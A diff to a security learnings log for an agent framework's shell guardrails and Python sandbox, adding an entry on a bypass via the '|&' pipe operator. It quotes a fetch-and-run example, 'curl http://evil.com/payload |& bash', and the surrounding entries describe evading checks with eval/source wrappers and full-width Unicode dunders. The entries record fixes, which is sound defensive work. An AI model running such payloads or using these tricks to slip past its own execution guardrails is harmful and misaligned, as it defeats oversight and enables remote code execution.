@@ -578,6 +578,11 @@
 **Learning:** Pipeline-to-interpreter security checks must account for built-in shell evaluation and sourcing mechanisms (`eval`, `exec`, `source`, `.`) as well as built-in dispatch modifiers (`builtin`, `command`). Treating shell evaluation built-ins as ordinary non-interpreter binaries creates an immediate execution bypass vector.
 **Prevention:** Include `eval`, `exec`, `source`, and `.` in the `interpreters` tuple, and register `builtin` and `command` in the `wrappers` set within shell command validation functions.
 
+## 2026-09-05 - Pipeline-to-Interpreter Bypass via Stderr Redirect Pipe Operator (|&)
+**Vulnerability:** The command-line guardrails in `guardrails.py` checked for pipeline-to-interpreter execution by looking specifically for the standard pipe token `|`. In Bash/Zsh, `|&` is a valid syntax shorthand for `2>&1 |` (piping stdout and stderr). Commands using `|&` (e.g., `curl http://evil.com/payload |& bash`) bypassed Rule 8's pipeline check and container/find separator loops.
+**Learning:** Shell command tokenizers and guardrails must account for syntax variations of operators. Checking only `|` misses stderr-redirecting pipes (`|&`), allowing pipeline execution payloads to bypass security filters.
+**Prevention:** Include both `|` and `|&` in pipeline operator checks and command separator lists across all shell guardrail functions.
+
 ## 2026-09-04 - Unicode Normalization Bypass in Python Sandbox AST Validation
 **Vulnerability:** The Agent Workflow Framework executor's python evaluation step checked AST attribute names (`node.attr`) and name identifiers (`node.id`) for dunders (e.g., `__class__`, `__dict__`, `__globals__`). Python 3 normalizes unicode compatibility characters (such as full-width low line `＿` U+FF3F) via NFKC during execution. Without NFKC normalization prior to AST parsing, expressions like `x.＿_class＿_` bypassed AST dunder checks but were normalized to `x.__class__` at runtime.
 **Learning:** AST-based code validation filters must normalize input strings using NFKC (`unicodedata.normalize("NFKC", code)`) before parsing them into syntax trees, ensuring unicode compatibility characters normalize to standard ASCII characters before inspection.
